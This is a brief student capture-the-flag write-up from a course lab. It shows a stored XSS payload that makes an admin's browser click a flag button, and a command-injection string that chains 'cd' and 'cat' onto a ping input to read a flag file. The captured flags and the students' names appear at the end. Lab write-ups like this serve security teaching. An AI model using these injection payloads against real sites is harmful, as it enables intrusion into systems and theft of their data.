# CTFs - Challenge 10
______________

# Task 1

## Vulnerability

By noticing we have an input field, we can try to inject javascript code to see if we can execute malicious code. We can try to inject the following code:

```html
<script>alert(1)</script>
```
![alert](/images/10_1.png)

## Exploit to make the admin give us the flag

After inspecting the page, we can see that the admin has a button to give us the flag. We can try to inject the following code to make the admin click the button:

```html
<script>document.getElementById('giveflag').click()</script> 
```
![giveflag](/images/10_2.png)
![flag](/images/10_3.png)


# Task 2

## RCE - Vulnerability
 
Since we can run a ping command, we can try to run other commands and test it. We can try to run the following command:

```bash
localhost && echo "You got hacked!" 
```

![hacked](/images/10_4.png)

## Exploit

We can try to run the following command to get the flag:

```bash
localhost && cd ../../../../../../../../flags && cat flag.txt
```

![flag](/images/10_5.png)

____________

# Submitted Flags
- **CTF 1** --> flag{86d3b3ecb36d053dfa4eb1dda63ad608}
- **CTF 2** --> flag{748d5494480f097fb85d707a1857f860}

____________

# Group 7, 22/11/2022
 
* Afonso Jorge Farroco Martins, up202005900@fe.up.pt
* Eduardo Filipe Leite da Silva, up202005283@fe.up.pt
* José Diogo Pinto, up202003529@fe.up.pt